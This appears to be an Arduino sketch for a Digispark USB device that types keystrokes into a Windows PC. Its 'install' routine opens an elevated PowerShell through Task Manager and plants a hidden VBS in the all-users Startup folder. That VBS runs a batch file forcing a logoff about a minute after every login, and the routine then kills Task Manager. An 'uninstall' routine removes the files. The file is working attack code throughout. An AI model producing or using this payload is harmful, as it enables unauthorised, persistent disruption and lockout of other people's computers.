#include <DigiKeyboard.h>

const int buttonPin = 2;
const int ledPin = 1;
int buttonState = 0;
int ledState = 0;
int last = 1;
int loops;
bool pressing = false;
bool launched = false;

void setup() {
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, LOW);
  pinMode(buttonPin, INPUT_PULLUP);
  DigiKeyboard.sendKeyStroke(0);
  blink(1);
}

void launch(int scriptSel) {
  if (scriptSel == 1) {
    // install
    DigiKeyboard.sendKeyStroke(KEY_ESC, KEY_MOD_LSHIFT | KEY_MOD_LCTRL);
    DigiKeyboard.delay(3000);
    DigiKeyboard.sendKeyStroke(KEY_F, KEY_MOD_LALT);
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_N);
    DigiKeyboard.delay(2000);
    DigiKeyboard.print("powershell");
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_SPACE);
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(3000);
    DigiKeyboard.println(F("\"ping -w 0 -n 60 127.0.0.0`nshutdown /l\" | Out-File -FilePath \"C:\\ProgramData\\Microsoft\\Windows\\system.bat\" -encoding ascii;\"Set WshShell = CreateObject(`\"WScript.Shell`\")`nWshShell.Run chr(34) & `\"C:\\ProgramData\\Microsoft\\Windows\\system.bat`\" & Chr(34), 0`nSet WshShell = Nothing\" | Out-File -FilePath \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\system.vbs\" -encoding ascii;taskkill /F /IM TaskMgr.exe;exit"));

    blink(3);
  }
  if (scriptSel == 2) {
    // uninstall
    DigiKeyboard.sendKeyStroke(KEY_ESC, KEY_MOD_LSHIFT | KEY_MOD_LCTRL);
    DigiKeyboard.delay(3000);
    DigiKeyboard.sendKeyStroke(KEY_F, KEY_MOD_LALT);
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_N);
    DigiKeyboard.delay(2000);
    DigiKeyboard.write("powershell  -c \"del \\\"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\system.vbs\\\";del \\\"C:\\ProgramData\\Microsoft\\Windows\\system.bat\\\";taskkill /F /IM TaskMgr.exe;\"");
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_SPACE);
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(300);
    blink(3);
  }
}

void blink(int count) {
  for (loops = 0; loops < count; loops++) {
    digitalWrite(ledPin, HIGH);
    delay(100);
    digitalWrite(ledPin, LOW);
    delay(100);
  }
  loops = 0;
}
void loop() {
  buttonState = digitalRead(buttonPin);
  ledState = digitalRead(ledPin);
  launched = false;
  if (buttonState == LOW) {
    if (!pressing) {
      pressing = true;
    }
    delay(300);
    buttonState = digitalRead(buttonPin);
    if (buttonState == HIGH) {
      last += 1;
      if (last >= 3) {
        last = 1;
      }
      blink(last);
    } else {
      blink(1);
      delay(1000);
      launched = true;
      if (last == 0) {
        last = 1;
      }
      launch(last);
    }

  } else {
    if (!launched) {
      pressing = false;
    }
  }
}
